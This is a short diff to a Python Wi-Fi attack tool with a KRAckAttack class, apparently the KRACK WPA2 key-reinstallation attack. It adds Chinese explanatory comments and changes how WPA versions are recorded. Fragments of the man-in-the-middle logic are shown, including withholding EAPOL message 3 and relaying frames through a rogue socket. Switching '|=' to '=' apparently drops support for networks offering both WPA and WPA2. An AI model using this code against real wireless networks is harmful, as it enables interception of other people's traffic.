@@ -298,12 +298,15 @@ class NetworkConfig():
 			elif el.ID == IEEE_TLV_TYPE_CHANNEL:
 				self.real_channel = ord(el.info.decode('unicode_escape')[0])
 			elif el.ID == IEEE_TLV_TYPE_RSN:
+				# 有 RSN Info 為 WPA2
 				self.parse_wparsn(el.info)
-				self.wpavers |= 2
+				self.wpavers = 2
 			elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info.decode('unicode_escape')[:4] == "\x00\x50\xf2\x01":
+				# Micrsoft OUI: 00 50 f2; OUI Type: 01 (WPA)
 				self.parse_wparsn(el.info[4:])
-				self.wpavers |= 1
+				self.wpavers = 1
 			elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info.decode('unicode_escape')[:4] == "\x00\x50\xf2\x02":
+				# Micrsoft OUI: 00 50 f2; OUI Type: 02 (WPA)
 				self.wmmenabled = 1
 
 			el = el.payload
@@ -536,9 +539,9 @@ class KRAckAttack():
 			else:
 				log(STATUS, "Not forwarding EAPOL msg3 (%d unique now queued)" % len(client.msg3s), color="green", showtime=False)
 
-			return True
+			return True # 不轉送封包
 
-		return False
+		return False # 轉送封包
 
 	def handle_from_client_pairwise(self, client, p):
 		if args.group: return
@@ -675,7 +678,6 @@ class KRAckAttack():
 						self.sock_rogue.send(p)
 					else:
 						self.sock_rogue.send(p)
-				# Group addressed frames
 				else:
 					self.sock_rogue.send(p)
 
